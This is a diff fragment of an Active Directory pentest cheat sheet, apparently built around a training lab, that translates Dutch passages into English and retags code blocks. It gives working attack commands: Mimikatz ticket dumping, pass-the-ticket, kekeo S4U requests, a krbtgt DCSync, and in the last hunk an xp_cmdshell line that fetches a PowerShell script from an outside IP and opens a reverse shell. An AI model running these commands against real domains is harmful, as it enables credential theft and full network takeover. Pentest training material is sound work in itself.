+Unconstrained delegation is a privilege that can be granted to users or computers, this almost always happens on computers with services such as ISS and MSSQL. These services usually require access to a backend database on behalf of the authenticated user. When a user authenticates to a computer that has Unlimited Kerberos Delegation enabled, the user's authenticated TGT ticket is stored in that computer's memory. If you have administrator access to this server, it is possible to dump all TGT tickets from memory.
 
 #### Discover domain computers which have unconstrained delegation
 Domain Controllers always show up, ignore them
-```
+```console
  . .\PowerView_dev.ps1
 Get-Netcomputer -UnConstrained
 Get-Netcomputer -UnConstrained | select samaccountname
@@ -6501,43 +6488,43 @@ Get-Netcomputer -UnConstrained | select samaccountname
 
 #### Check if any DA tokens are available on the unconstrained machine
 Wait for a domain admin to login while checking for tokens
-```
+```console
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 ```
 
 #### Export the TGT ticket
-```
+```console
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
 #### Reuse the TGT ticket
-```
+```console
 Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```
 
 ## Constrained Delegation
-Als je over een account of computer beschikt met de constrained delegation privilege is het mogelijk om je voor te doen als elk andere gebruiker en jezelf te authentiseren naar een service waar de gebruiker mag delegeren.
+If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.
 ### Enumerate
 #### Enumerate users with contrained delegation enabled
-```
+```console
 Get-DomainUser -TrustedToAuth
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
 #### Enumerate computers with contrained delegation enabled
-```
+```console
 Get-Domaincomputer -TrustedToAuth
 Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 ### Constrained delegation User
 #### Requesting TGT with kekeo
-```
+```powershell
 ./kekeo.exe
 Tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
 ```
 
 #### Requesting TGS with kekeo
-```
+```powershell
 Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
 ```
 
@@ -6566,7 +6553,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
 ```
 
 ## DNS Admins
-Indien je over een gebruiker bezit die lid is van de 'DNS admin' is het mogelijk om verschillende aanvallen uit te voeren op de DNS server (Meestal Domain Controller) Het is mogelijk om hier een reverse shell mee te krijgen, maar dit legt heel het DNS verkeer plat binnen het domein aangezien dit de DNS service bezighoudt! Voor meer informatie zie [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise]
+If you have a user who is a member of the 'DNS admin' it is possible to carry out various attacks on the DNS server (Usually Domain Controller). It is possible to get a reverse shell with this, but this completely complicates the process. DNS traffic within the domain is down as this keeps the DNS service busy! For more information see [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise]
+
 #### Enumerate member of the DNS admin group
 ```powershell
 Get-NetGRoupMember “DNSAdmins”
@@ -6712,5 +6700,4 @@ Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell
 ```console
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
-
-
+---
